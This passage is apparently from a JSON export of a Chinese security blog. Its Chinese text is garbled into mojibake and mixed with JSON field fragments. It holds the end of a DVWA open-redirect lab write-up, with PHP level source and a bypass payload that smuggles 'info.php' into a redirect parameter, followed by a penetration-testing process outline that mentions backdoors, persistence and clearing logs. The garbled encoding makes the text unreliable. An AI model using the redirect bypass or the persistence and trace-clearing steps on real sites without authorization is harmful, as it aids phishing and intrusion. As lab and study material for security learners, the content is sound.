ä¸åŒ…å«èµ„æºä½ç½®çš„å…¨éƒ¨ä¿¡æ¯ï¼Œå¿…é¡»ç»“åˆå½“å‰ç½‘é¡µçš„ä½ç½®ï¼Œæ‰èƒ½å®šä½èµ„æºã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µçš„ URL æ˜¯https://www.example.com/path/index.htmlï¼Œè¯¥ç½‘é¡µä¸Šé¢æœ‰ä¸€ä¸ªèµ„æºï¼ŒURL æŒ‡å‘a.htmlï¼Œè¿™ä¸ªå°±æ˜¯ç›¸å¯¹ URLã€‚å› ä¸ºåªçŸ¥é“a.htmlï¼Œå¹¶ä¸èƒ½å®šä½èµ„æºã€‚æµè§ˆå™¨å‡å®šï¼Œa.htmlä¸å½“å‰ç½‘å€åœ¨åŒä¸€ä¸ªå­ç›®å½•ä¸‹é¢ï¼Œä»è€Œå¾—åˆ°ç»å¯¹ URL https://www.example.com/path/a.htmlã€‚ ç›¸å¯¹ URL å¦‚æœä»¥æ–œæ ï¼ˆ/ï¼‰å¼€å¤´ï¼Œå°±è¡¨ç¤ºç½‘ç«™çš„æ ¹ç›®å½•ã€‚å¦åˆ™ï¼Œå¿…é¡»ä»¥å½“å‰ç›®å½•ä¸ºèµ·ç‚¹ï¼Œæ¨ç®—èµ„æºçš„ä½ç½®ã€‚æ¯”å¦‚ï¼Œç›¸å¯¹ URL /foo/bar.htmlè¡¨ç¤ºç½‘ç«™æ ¹ç›®å½•çš„å­ç›®å½•fooï¼Œfoo/bar.htmlè¡¨ç¤ºåœ¨å½“å‰ç›®å½•çš„fooå­ç›®å½•ã€‚ URL è¿˜å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªç‰¹æ®Šç®€å†™ï¼Œè¡¨ç¤ºç‰¹å®šä½ç½®ã€‚ .ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ï¼Œæ¯”å¦‚./a.htmlï¼ˆå½“å‰ç›®å½•ä¸‹çš„a.htmlæ–‡ä»¶ï¼‰ ..ï¼šè¡¨ç¤ºä¸Šçº§ç›®å½•ï¼Œæ¯”å¦‚../a.htmlï¼ˆä¸Šçº§ç›®å½•ä¸‹çš„a.htmlæ–‡ä»¶ï¼‰ è¿™ä¸¤ç§ç®€å†™å¯ä»¥å¤šä¸ªè¿ç”¨ï¼Œæ¯”å¦‚../../è¡¨ç¤ºä¸Šä¸¤çº§ç›®å½•ã€‚ ç»å¯¹ URL ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªç®€å†™ï¼Œæ¯”å¦‚www.example.com/./index.htmlç­‰åŒäºwww.example.com/index.htmlï¼Œè¿™æ—¶.ç›¸å½“äºæ ¹ç›®å½•çš„å½“å‰ç›®å½•ï¼Œå³æ ¹ç›®å½•æœ¬èº«ã€‚ å› æ­¤è¿™ä¸€å…³æˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€  High &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; if (strpos($_GET[&#x27;redirect&#x27;], &quot;info.php&quot;) !== false) &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; else &#123; http_response_code (500); ?&gt; &lt;p&gt;You can only redirect to the info page.&lt;/p&gt; &lt;?php exit; &#125; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; è¿™é‡Œæ£€æŸ¥redirectä¸­æ˜¯å¦å«æœ‰info.phpå­—ç¬¦ä¸²ï¼Œå¦‚æœå«æœ‰æ‰ä¼šæ­£å¸¸çš„å»è¯·æ±‚é‡å®šå‘ï¼Œå¦åˆ™è¿”å›500ã€‚ ç”±ä»£ç å®¡è®¡å¾—ï¼Œåœ¨æ„é€ å‚æ•°æ—¶æ˜¯æŒ‡åŒ…å«å­—ç¬¦ä¸²info.phpå³å¯ Payloadï¼š?redirect=https//www.baidu.com/?å·²å®šä¹‰å‚æ•°=info.php æ³¨æ„ï¼šéœ€è¦å‚è€ƒç½‘é¡µæ”¯æŒçš„å‚æ•°æ¥ä¼ é€’info.phpã€‚ä¾‹å¦‚ å½“è¯¥ç½‘é¡µæ²¡æœ‰è®¾å®šaå‚æ•°çš„getä¼ å‚æ—¶ï¼š GET ?redirect=https//www.baidu.com/?a=info.php æ˜¯æ— æ•ˆçš„ï¼Œå› ä¸ºå­—ç¬¦ä¸²&quot;info.php&quot;å¹¶æœªä¼ é€’ç»™åˆæ³•çš„å‚æ•° Impossible &lt;?php $target = &quot;&quot;; if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;redirect&#x27;])) &#123; switch (intval ($_GET[&#x27;redirect&#x27;])) &#123; case 1: $target = &quot;info.php?id=1&quot;; break; case 2: $target = &quot;info.php?id=2&quot;; break; case 99: $target = &quot;https://digi.ninja&quot;; break; &#125; if ($target != &quot;&quot;) &#123; header (&quot;location: &quot; . $target); exit; &#125; else &#123; ?&gt; Unknown redirect target. &lt;?php exit; &#125; &#125; ?&gt; Missing redirect target. è¿™é‡Œé‡‡ç”¨äº†è¡¨åå•è¿‡æ»¤ï¼Œå¹¶ä¸”å°†redirectå‚æ•°å†…å®¹è½¬æ¢ä¸ºäº†æ•´æ•°ï¼Œè¿™æ„å‘³ç€redirectå¯¹æˆ‘ä»¬æ¥è¯´å·²ç»ä¸å¯æ§äº† 0x18 å‚è€ƒæ–‡ç«  [ç½‘ç»œå®‰å…¨] DVWAä¹‹Open HTTP Redirect æ”»å‡»å§¿åŠ¿åŠè§£é¢˜è¯¦æåˆé›† ç»å¯¹ URL å’Œç›¸å¯¹ URL DVWA å…¥é—¨é¶åœºå­¦ä¹ è®°å½•","tags":["webæ¸—é€"],"categories":["Webæ¸—é€é¶åœº"]},{"title":"æ¸—é€æµ‹è¯•æµç¨‹&å¤–ç½‘æ‰“ç‚¹","path":"/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/","content":"0x01 å‰è¨€ ç»ˆäºæŠ½å‡ºæ—¶é—´æ¥å­¦ä¹ äº†ï¼Œçœ‹äº†çœ‹st3pbyå¸ˆå‚…ç»™çš„èµ„æ–™ï¼Œå¯¹äºæ¸—é€æµ‹è¯•æµç¨‹ä¸ç†Ÿæ‚‰çš„æˆ‘ï¼Œæ„Ÿè§‰éœ€è¦å­¦çš„æŒºå¤šçš„ï¼Œä¼°è®¡åˆæ˜¯ä¸€åœºæ¶æˆ˜ï¼Œè¯ä¸å¤šè¯´ç›´æ¥å¼€å·ï¼ï¼ 0x02 æ¸—é€æµ‹è¯•åŸºæœ¬æµç¨‹ è¿™é‡Œå…ˆå­¦ä¹ ä¸€ä¸‹å¤§è‡´æµ‹è¯•çš„æ¡†æ¶æµç¨‹ï¼š å¤§è‡´å¯åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼šä¿¡æ¯æœé›†ã€æ¼æ´å‘ç°ã€æ¼æ´åˆ©ç”¨ã€‚ä½†æ”¾åˆ°å®æˆ˜ä¸­ï¼Œè¿™ä¸‰ä¸ªæ–¹é¢åˆå¯ä»¥æœ‰å¾ˆå¤šçš„ç»†èŠ‚ä¼˜åŒ–ï¼Œè¿›ä¸€æ­¥æ·±å…¥æ˜ç¡®æµ‹è¯•æµç¨‹ï¼Œè¿™é‡Œä¸»è¦é€šè¿‡9ä¸ªé˜¶æ®µæ¥å­¦ä¹ ä¸€ä¸‹æ•´ä¸ªæµ‹è¯•æµç¨‹ã€‚ æ¸—é€æµ‹è¯•ä¸€èˆ¬å°±æ˜¯å…¸å‹çš„é»‘ç›’æµ‹è¯•ï¼Œå°±æ˜¯æ¨¡æ‹Ÿé»‘å®¢çš„å…¥ä¾µï¼›è¿˜æœ‰ä¸€ç§å«ç™½ç›’æ¸—é€ï¼Œæ˜¯åœ¨äº†è§£äº†ä¸€äº›å†…éƒ¨çš„æƒ…å†µä¹‹åå†æŒ–æ˜æ¼æ´ã€‚ä¸€èˆ¬æ€§é»‘ç›’æµ‹è¯•çš„ä¸œè¥¿å¤šä¸€ç‚¹ã€‚ 2.1 ç¡®å®šç›®æ ‡ èŒƒå›´çš„ç¡®å®š æµ‹è¯•çš„èŒƒå›´ï¼šæˆ‘ä»¬è¦çŸ¥é“å½“å‰æµ‹è¯•çš„èŒƒå›´æ˜¯IPã€åŸŸåã€å†…ç½‘å’Œå¤–ç½‘ã€æ•´ä¸ªç½‘ç«™è¿˜æ˜¯ç½‘ç«™çš„æŸä¸ªåŠŸèƒ½æ¨¡å—ï¼Ÿ ä¸€èˆ¬æ¥è¯´å¯èƒ½æµ‹è¯•çš„æ˜¯ä¸€ä¸ªå…¬å¸æˆ–ä¼ä¸šçš„å†…éƒ¨ç½‘ç»œï¼Œé’ˆå¯¹çš„å¤§éƒ¨åˆ†æ˜¯æœåŠ¡å™¨ã€‚æˆ–è€…æ˜¯ä¸€ä¸ªç½‘ç«™æˆ–ç½‘ç«™ç¾¤ï¼Œæˆ–è€…æ˜¯ä¸€äº›è½¯ä»¶åº”ç”¨æˆ–è€…APPï¼Œè¿™ç±»çš„è¯ä¸€èˆ¬éƒ½æ˜¯è·å–åº”ç”¨çš„åå°æœåŠ¡å™¨çš„æƒé™ã€‚ è§„åˆ™çš„ç¡®å®š æˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬å¯ä»¥æµ‹è¯•åˆ°ä»€ä¹ˆç¨‹åº¦ï¼šæ˜¯å‘ç°æ¼æ´å³å¯ï¼Œè¿˜æ˜¯è¦è¿›ä¸€æ­¥åˆ©ç”¨æ¼æ´ï¼›æ˜¯å¦æœ‰æ—¶é—´é™åˆ¶ã€æ˜¯å¦å¯ä»¥ä¿®æ”¹ä¸Šä¼ ã€èƒ½å¦ææƒç­‰ç­‰ç­‰ç­‰ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šé—®æˆ‘ä»¬å¯ä»¥åšä»€ä¹ˆä¸å¯ä»¥åšä»€ä¹ˆã€‚è¿™é‡Œå¡«å……ä¸€ä¸‹æ–‡ç« ç»™çš„ï¼š ç›®æ ‡ç³»ç»Ÿä»‹ç»ã€é‡ç‚¹ä¿æŠ¤å¯¹è±¡åŠç‰¹æ€§ã€‚ æ˜¯å¦å…è®¸æ•°æ®ç ´åï¼Ÿ æ˜¯å¦å…è®¸é˜»æ–­ä¸šåŠ¡æ­£å¸¸è¿è¡Œï¼Ÿ æµ‹è¯•ä¹‹å‰æ˜¯å¦åº”å½“çŸ¥ä¼šç›¸å…³éƒ¨é—¨æ¥å£äººï¼Ÿ æ¥å…¥æ–¹å¼ï¼Ÿå¤–ç½‘å’Œå†…ç½‘ï¼Ÿ æµ‹è¯•æ˜¯å‘ç°é—®é¢˜å°±ç®—æˆåŠŸï¼Œè¿˜æ˜¯å°½å¯èƒ½çš„å‘ç°å¤šçš„é—®é¢˜ï¼Ÿ æ¸—é€è¿‡ç¨‹æ˜¯å¦éœ€è¦è€ƒè™‘ç¤¾ä¼šå·¥ç¨‹ï¼Ÿ éœ€æ±‚çš„ç¡®å®š æˆ‘ä»¬éœ€è¦æ˜ç¡®è®©æˆ‘ä»¬æµ‹è¯•çš„éœ€æ±‚å…·ä½“æ˜¯ä»€ä¹ˆï¼šwebåº”ç”¨çš„æ¼æ´(æ–°ä¸Šçº¿ç¨‹åº)ï¼Ÿä¸šåŠ¡é€»è¾‘æ¼æ´ï¼ˆé’ˆå¯¹ä¸šåŠ¡çš„ï¼‰ï¼Ÿäººå‘˜æƒé™ç®¡ç†æ¼æ´ï¼ˆé’ˆå¯¹äººå‘˜ã€æƒé™ï¼‰ï¼Ÿæ ¹æ®éœ€æ±‚å’Œè‡ªå·±æŠ€æœ¯èƒ½åŠ›æ¥ç¡®å®šèƒ½ä¸èƒ½åšã€èƒ½åšå¤šå°‘ï¼Œç‚¹åˆ°ä¸ºæ­¢ã€‚ 2.2 åˆ†æé£é™©ï¼Œè·å¾—æˆæƒ è¿™é‡Œçš„çŸ¥è¯†å°±ä¸æ‡‚äº†ï¼Œæ²¡äº†è§£è¿‡ã€‚ã€‚ã€‚ç›´æ¥cvåŠ è‡ªå·±çš„æµ…è–„ç†è§£äº† åˆ†ææ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¯èƒ½äº§ç”Ÿçš„é£é™©ï¼Œå¦‚å¤§é‡æµ‹è¯•æ•°æ®çš„å¤„ç†ã€å½±å“æ­£å¸¸ä¸šåŠ¡å¼€å±•ã€æœåŠ¡å™¨å‘ç”Ÿå¼‚å¸¸çš„åº”æ€¥ã€æ•°æ®å¤‡ä»½å’Œæ¢å¤ã€æµ‹è¯•äººåŠ›ç‰©åŠ›æˆæœ¬â€¦ ç”±æµ‹è¯•æ–¹ä¹¦å†™å®æ–½æ–¹æ¡ˆåˆç¨¿å¹¶æäº¤ç»™å®¢æˆ·ï¼ˆoræœ¬å…¬å¸å†…éƒ¨é¢†å¯¼ï¼‰è¿›è¡Œå®¡æ ¸ã€‚åœ¨å®¡æ ¸å®Œæˆåï¼Œä»å®¢æˆ·ï¼ˆoræœ¬å…¬å¸å†…éƒ¨é¢†å¯¼ï¼‰è·å–å¯¹æµ‹è¯•æ–¹è¿›è¡Œä¹¦é¢å§”æ‰˜æˆæƒä¹¦ï¼Œæˆæƒæµ‹è¯•æ–¹è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚ï¼ˆä¸æˆæƒä¸æµ‹è¯•~~~ï¼‰ 2.3 ä¿¡æ¯æœé›† è¿™é‡Œä¸€å—å¯ä»¥è¯´æ˜¯å¥ å®šäº†ä¸€æ¬¡æ¸—é€æµ‹è¯•æ˜¯å¦ä¼šæˆåŠŸçš„åŸºç¡€ï¼Œè™½ç„¶ä¹‹å‰æœ‰æ‰€æ€»ç»“ï¼Œä½†ç°åœ¨ä¹Ÿå‡ ä¹å¿˜äº†ï¼Œå› æ­¤è¿™ä¸€å—å¾—é‡ç‚¹æ¸©ä¹ ä¸€ä¸‹ï¼ˆä»¤èµ·ä¸€éƒ¨åˆ†ï¼‰ã€‚ é¦–å…ˆæ˜ç¡®ä¸€ä¸‹ä¿¡æ¯æœé›†é˜¶æ®µçš„ç›®çš„ï¼šå°½å¯èƒ½å¤šçš„è·å–åˆ°ç›®æ ‡webåº”ç”¨çš„å„ç§ä¿¡æ¯ã€‚ ä¿¡æ¯åŒ…æ‹¬ï¼šè„šæœ¬è¯­è¨€ç±»å‹ã€æœåŠ¡å™¨ç±»å‹ã€ç›®å½•ç»“æ„ã€æ˜¯å¦ä½¿ç”¨å¼€æºè½¯ä»¶ä¸”ä½¿ç”¨çš„å“ªç§å¼€æºè½¯ä»¶ã€æ•°æ®åº“ç±»å‹ã€é¡µé¢æ‰€å«çš„è¶…é“¾æ¥ã€éƒ¨ç½²åº”ç”¨ç”¨åˆ°çš„æ¡†æ¶ã€ä¸­é—´ä»¶ç±»å‹ã€ç”¨åˆ°äº†å“ªäº›ç½‘ç»œæœåŠ¡ï¼ˆSSHã€FTPï¼‰ã€ä½¿ç”¨çš„å“ªç§CMSç­‰ç­‰è¿˜æœ‰å¾ˆå¤šã€‚ è€Œå…¶ä¸­æœé›†åˆ©ç”¨åˆ°çš„æ–¹å¼ä¸ºï¼šä¸»åŠ¨æ‰«æï¼›å¼€æ”¾æœç´¢ï¼›åˆ©ç”¨æœç´¢å¼•æ“è·å–åå°ã€æœªæˆæƒé¡µé¢ã€æ•æ„Ÿurlç­‰ç­‰ åŸºç¡€ä¿¡æ¯ï¼šIPï¼Œç½‘æ®µï¼ŒåŸŸåï¼Œç«¯å£ï¼Œæ—ç«™ã€Cæ®µ ç³»ç»Ÿä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿç‰ˆæœ¬--ã€‹åœ¨ä¹‹åçš„ææƒä¸­æ‰èƒ½â€œå¯¹ç—‡ä¸‹è¯â€ åº”ç”¨ä¿¡æ¯ï¼šå„ç«¯å£çš„åº”ç”¨ï¼Œä¾‹å¦‚webåº”ç”¨ï¼Œé‚®ä»¶åº”ç”¨ç­‰ ç‰ˆæœ¬ä¿¡æ¯ï¼šæ‰€æœ‰æ¢æµ‹åˆ°çš„ç‰ˆæœ¬ æœåŠ¡ä¿¡æ¯ï¼šæœåŠ¡å™¨ç±»å‹ã€ç‰ˆæœ¬ã€ä¸­é—´ä»¶ã€æ•°æ®åº“ã€è„šæœ¬ç±»å‹ã€è½¯ä»¶ç±»å‹ï¼ˆå¾®ä¿¡ï¼ŒChromeï¼‰ã€ç”¨åˆ°çš„ç½‘ç»œæœåŠ¡ äººå‘˜ä¿¡æ¯ï¼šåŸŸåæ³¨å†Œäººå‘˜ä¿¡æ¯ï¼Œwebåº”ç”¨ä¸­ç½‘ç«™å‘å¸–äººçš„idï¼Œç®¡ç†å‘˜å§“åç­‰ é˜²æŠ¤ä¿¡æ¯ï¼šè¯•ç€çœ‹èƒ½å¦æ¢æµ‹åˆ°é˜²æŠ¤è®¾å¤‡ è¿™ç§ä¿¡æ¯ä¸€èˆ¬å¯ä»¥å…ˆé€šè¿‡éƒ¨åˆ†åŠŸèƒ½å¼ºå¤§çš„å°æ’ä»¶å…ˆè·å– 2.4 æ¼æ´æ¢æµ‹ï¼ˆæ‰‹åŠ¨&amp;è‡ªåŠ¨ï¼‰ åˆ°äº†è¿™ä¸€é˜¶æ®µå°±éœ€è¦åˆ©ç”¨2.3æœé›†åˆ°çš„å„ç±»ä¿¡æ¯ï¼Œå°è¯•æ‰¾åˆ°ç›¸åº”çš„æ¼æ´è¿›è¡Œæ¢æµ‹ã€‚ æ¢æµ‹æ–¹æ³• å„ç±»æ¼æ‰«å·¥å…·ï¼šAWVSã€AppScanç­‰ç­‰ï¼› ç»“åˆæ¼æ´å»å¼€æºæ¼æ´åº“ï¼ˆexploit-dbï¼‰ç­‰åœ°æ–¹å»å°è¯•å¯»æ‰¾æ˜¯å¦æ˜¯å·²ç»å…¬å¼€è¿‡çš„æ¼æ´ã€‚ ç½‘ç»œæ¼«æ¸¸æ‰¾å¯»æ¼æ´éªŒè¯POC å¹³å¸¸ä¹Ÿéœ€è¦å¤šå…³æ³¨ä¸€äº›å…³äºç½‘ç»œå®‰å…¨çš„æ–°é—»ï¼ŒæŒæ¡æ¼æ´å®æ—¶æ¶ˆæ¯ï¼Œè¯´ä¸å®šæ—¥åå°±ä¸ä¼šç”¨åˆ°çš„ ç®€å•åˆ—ä¸¾ä¸€ä¸‹å¸¸è§çš„è½¯ä»¶æ¼æ´ï¼š XAMPPææƒæ¼æ´ WordPresså¤§é‡æ¼æ´ PhpStudyæ¼æ´ phpMyAdminæ¼æ´ IISä½ç‰ˆæœ¬è§£ææ¼æ´ Nginx/Apacheè§£ææ¼æ´ SSHåé—¨æ¼æ´ FTP/RDPç­‰ç½‘ç»œæœåŠ¡å¼±å£ä»¤æ¼æ´ Rloginåé—¨æ¼æ´ æ¢æµ‹å†…å®¹ ç³»ç»Ÿæ¼æ´ï¼šæ‰¾å¯»å¯¹æ–¹ç³»ç»Ÿæ˜¯å¦æ²¡æœ‰æ‰“å…¥ç›¸å…³è¡¥ä¸ï¼Œå¹¸è¿åœ°è¯å¯èƒ½ä¼šå‘ç°å¯¹æ–¹æ“ä½œç³»ç»Ÿå¹¶æœªåŠæ—¶æ‰“è¡¥ä¸ï¼Œåæœå°±æ˜¯ç›´æ¥æ‹¿ä¸‹ï¼ Webserveræ¼æ´ï¼šWebserveré…ç½®é—®é¢˜â€“ä¹Ÿå°±æ˜¯ä¸­é—´ä»¶æ¼æ´ï¼ˆè¿™ä¸€å—çˆ†çš„æ¼æ´è¿˜æ˜¯å¾ˆå¤šçš„ï¼‰ Webåº”ç”¨æ¼æ´ï¼šWebåº”ç”¨å¼€å‘é—®é¢˜ã€è¿˜æœ‰å°±æ˜¯Webå¼€å¯äº†å…¶ä»–ç«¯å£çš„æœåŠ¡ï¼Œä½†å´æ²¡è®¾ç½®æˆæƒè®¿é—®ï¼Œæˆ–è€…å¯ä»¥å¼±å£ä»¤æ‰“å…¥ã€‚ å„ç§ç«¯å£æœåŠ¡ï¼šè¿™é‡Œä¸»è¦æ˜¯é’ˆå¯¹ç«¯å£æœåŠ¡çš„å¼€å¯ï¼Œæ¯”å¦‚21â€“FTPã€8080â€“è¿™é‡Œå¯èƒ½æœ‰Apache-tomcatã€struct2ç­‰ç­‰ï¼Œå¸¸è¢«ç”¨äºä»£ç†wwwæœåŠ¡ã€7001ç«¯å£â€“ä¸€èˆ¬ä¸ºweblogicæœåŠ¡ã€22â€“Linux-SSHè¿œç¨‹è¿æ¥æœåŠ¡ã€3389â€“Windowsè¿œç¨‹æ¡Œé¢è¿æ¥ç­‰ç­‰ã€‚ é€šä¿¡å®‰å…¨ï¼šçœ‹çœ‹ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ•æ„Ÿæ•°æ®æ˜¯æ˜æ–‡çš„ã€æ¯”å¦‚tokenåœ¨cookieçš„ä¼ è¾“ã€jwtåŠ å¯†æ‰€ç”¨çš„keyã€å„ç±»åŠ å¯†ç›ç­‰ç­‰ã€‚ 2.5 æ¼æ´éªŒè¯ å°†ä¸Šä¸€æ­¥å‘ç°çš„æœ‰å¯èƒ½å¯ä»¥æˆåŠŸåˆ©ç”¨çš„æ¼æ´éƒ½éªŒè¯ä¸€éã€‚ç»“åˆå®é™…æƒ…å†µï¼Œæ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸåå†åœ¨ç›®æ ‡ä¸­å®ç°ï¼ŒéªŒè¯å‘é¢åŒ…æ‹¬ä¸€ä¸‹å†…å®¹ï¼š è‡ªåŠ¨åŒ–éªŒè¯ï¼šç»“åˆè‡ªåŠ¨åŒ–æ‰«æå·¥å…·æä¾›çš„ç»“æœ æ‰‹å·¥éªŒè¯ï¼šæ ¹æ®å…¬å¼€èµ„æºè¿›è¡ŒéªŒè¯ è¯•éªŒéªŒè¯ï¼šè‡ªå·±æ­å»ºæ¨¡æ‹Ÿç¯å¢ƒè¿›è¡ŒéªŒè¯ ç™»å½•çŒœè§£ï¼šæœ‰æ—¶å¯ä»¥å°è¯•çŒœè§£ä¸€ä¸‹ç™»é™†å£çš„è´¦å·å¯†ç ç­‰ä¿¡æ¯ï¼Œå¯å…³æ³¨å‰ç«¯jsæ¥å£ã€‚ ä¸šåŠ¡æ¼æ´éªŒè¯ï¼šå¦‚å‘ç°ä¸šåŠ¡æ¼æ´ï¼Œè¦è¿›è¡ŒéªŒè¯ å…¬å¼€èµ„æºçš„åˆ©ç”¨exploit-db/wooyun/æ¸—é€ä»£ç ç½‘ç«™é€šç”¨ã€ç¼ºçœå£ä»¤å‚å•†çš„æ¼æ´è­¦å‘Šç­‰ 2.6 ä¿¡æ¯åˆ†æ è¿™ä¸€æ­¥æ˜¯ä¸ºä¸‹ä¸€æ­¥å®æ–½å…·ä½“æ¸—é€åšå‡†å¤‡ã€‚ ç²¾å‡†æ”»å‡»ï¼šå‡†å¤‡å¥½ä¸Šä¸€æ­¥æ¢æµ‹åˆ°çš„æ¼æ´expï¼ˆæ¼æ´åˆ©ç”¨ï¼‰ï¼Œç”¨æ¥å¯¹æŸä¸ªæ¨¡å—è¿›è¡Œç²¾å‡†æ”»å‡» ç»•è¿‡é˜²å¾¡æœºåˆ¶ï¼šæ˜¯å¦æœ‰é˜²ç«å¢™ç­‰è®¾å¤‡ï¼Œå¦‚ä½•ç»•è¿‡ å®šåˆ¶æ”»å‡»è·¯å¾„ï¼šæœ€ä½³å·¥å…·è·¯å¾„ï¼Œæ ¹æ®è–„å¼±ç‚¹å…¥å£ï¼Œææ¸…æ¥šå†…ç½‘æƒé™ä½ç½®ï¼Œç¡®å®šæœ€ç»ˆç›®æ ‡ ç»•è¿‡æ£€æµ‹æœºåˆ¶ï¼šæ˜¯å¦æœ‰æ£€æµ‹æœºåˆ¶ï¼Œæµé‡ç›‘æ§ï¼Œæ€æ¯’è½¯ä»¶ï¼Œæ¶æ„ä»£ç æ£€æµ‹ç­‰ï¼ˆå…æ€ï¼‰ æ”»å‡»ä»£ç ï¼šç»è¿‡è¯•éªŒå¾—æ¥çš„ä»£ç ï¼ŒåŒ…æ‹¬ä¸é™äºxssä»£ç ï¼Œsqlæ³¨å…¥è¯­å¥ç­‰ 2.7 åˆ©ç”¨æ¼æ´è·å–æ•°æ® å®æ–½æ”»å‡»ï¼šæ ¹æ®å‰å‡ æ­¥çš„ç»“æœï¼Œè¿›è¡Œæ”»å‡» è·å–å†…éƒ¨ä¿¡æ¯ï¼šåŸºç¡€è®¾æ–½ï¼ˆç½‘ç»œè¿æ¥ï¼Œvpnï¼Œè·¯ç”±ï¼Œæ‹“æ‰‘ç­‰ï¼‰ è¿›ä¸€æ­¥æ¸—é€ï¼šå†…ç½‘å…¥ä¾µï¼Œæ•æ„Ÿç›®æ ‡ æŒç»­æ€§å­˜åœ¨ï¼šä¸€èˆ¬å¯¹å®¢æˆ·åšæ¸—é€ä¸éœ€è¦ã€‚rookitï¼Œåé—¨ï¼Œæ·»åŠ ç®¡ç†è´¦å·ï¼Œé©»æ‰æ‰‹æ³•ç­‰ æ¸…ç†ç—•è¿¹ï¼šæ¸…ç†ç›¸å…³æ—¥å¿—ï¼ˆè®¿é—®ï¼Œæ“ä½œï¼‰ï¼Œä¸Šä¼ æ–‡ä»¶ç­‰ 2.8 ä¿¡æ¯æ•´ç† æ•´ç†æ¸—é€å·¥å…·ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­ç”¨åˆ°çš„ä»£ç ï¼Œpocï¼Œexpç­‰ æ•´ç†æ”¶é›†ä¿¡æ¯ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­æ”¶é›†åˆ°çš„ä¸€åˆ‡ä¿¡æ¯ æ•´ç†æ¼æ´ä¿¡æ¯ï¼šæ•´ç†æ¸—é€è¿‡ç¨‹ä¸­é‡åˆ°çš„å„ç§æ¼æ´ï¼Œå„ç§è„†å¼±ä½ç½®ä¿¡æ¯ ç›®çš„ï¼šä¸ºäº†æœ€åå½¢æˆæŠ¥å‘Šï¼Œå½¢æˆæµ‹è¯•ç»“æœä½¿ç”¨ã€‚ 2.9 å½¢æˆæŠ¥å‘Š æŒ‰éœ€æ•´ç†ï¼šæŒ‰ç…§ä¹‹å‰ç¬¬ä¸€æ­¥è·Ÿå®¢æˆ·ç¡®å®šå¥½çš„èŒƒå›´ï¼Œéœ€æ±‚æ¥æ•´ç†èµ„æ–™ï¼Œå¹¶å°†èµ„æ–™å½¢æˆæŠ¥å‘Š è¡¥å……ä»‹ç»ï¼šè¦å¯¹æ¼æ´æˆå› ï¼ŒéªŒè¯è¿‡ç¨‹å’Œå¸¦æ¥å±å®³è¿›è¡Œåˆ†æ ä¿®è¡¥å»ºè®®ï¼šè¦å¯¹æ‰€æœ‰äº§ç”Ÿçš„é—®é¢˜æå‡ºåˆç†é«˜æ•ˆå®‰å…¨çš„è§£å†³åŠæ³• 0x03 ä¿¡æ¯æœé›† è¿™é‡Œå°±å•ç‹¬ç€é‡å­¦ä¹ ä¸€ä¸‹ä¿¡æ¯æœé›†çš„å„ç±»å¥‡æ·«å·§æŠ€å§ã€‚ 3.1 ä¿¡æ¯æœé›†çš„åˆ†ç±» 1ã€ä¸»åŠ¨å¼ä¿¡æ¯æœé›†ï¼ˆå¯è·å–åˆ°çš„ä¿¡æ¯è¾ƒå¤šï¼Œä½†æ˜“è¢«ç›®æ ‡å‘ç°ï¼‰ 2ã€é€šè¿‡ç›´æ¥å‘èµ·ä¸è¢«æµ‹ç›®æ ‡ç½‘ç»œä¹‹é—´çš„äº’åŠ¨æ¥è·å–ç›¸å…³ä¿¡æ¯ï¼Œå¦‚é€šè¿‡Nmapæ‰«æç›®æ ‡ç³»ç»Ÿã€‚ 3ã€è¢«åŠ¨å¼ä¿¡æ¯æœé›†ï¼ˆæœé›†åˆ°çš„ä¿¡æ¯è¾ƒå°‘ï¼Œä½†ä¸æ˜“è¢«å‘ç°ï¼‰ 4ã€é€šè¿‡ç¬¬ä¸‰æ–¹æœåŠ¡æ¥è·å–ç›®æ ‡ç½‘ç»œç›¸å…³ä¿¡æ¯ã€‚å¦‚é€šè¿‡æœç´¢å¼•æ“æ–¹å¼æ¥æœé›†ä¿¡æ¯ã€‚ 3.2 æœé›†ä»€ä¹ˆä¿¡æ¯ 1ã€whoisä¿¡æ¯ï¼ˆå¾®æ­¥ï¼‰ 2ã€ç½‘ç«™æ¶æ„ 3ã€dnsä¿¡æ¯ï¼ˆé€šè¿‡æŸ¥è¯¢dnsæˆ‘ä»¬å¯ä»¥æ£€æµ‹æ˜¯å¦å­˜åœ¨dnsåŸŸä¼ é€æ¼æ´ï¼‰ 4ã€å­åŸŸåæœé›† 5ã€æ•æ„Ÿç›®å½•åŠæ•æ„Ÿä¿¡æ¯ã€æºç æ³„éœ²ï¼ˆæœç´¢å¼•æ“+å·¥å…·ï¼‰ 6ã€è„†å¼±ç³»ç»Ÿï¼ˆç½‘ç»œç©ºé—´ï¼‰ 7ã€æ—ç«™æŸ¥è¯¢ 8ã€Cç«¯æŸ¥è¯¢ 9ã€æŒ‡çº¹ä¿¡æ¯ 10ã€ç«¯å£æœåŠ¡ 11ã€å¤‡æ¡ˆä¿¡æ¯ 12ã€çœŸå®ip 13ã€æ¢æµ‹waf 14ã€ç¤¾å·¥ï¼ˆæœ‹å‹åœˆã€å¾®åšã€qqç©ºé—´ã€æ±‚èŒã€äº¤æ˜“ç­‰ç¤¾äº¤å¹³å°ï¼‰ 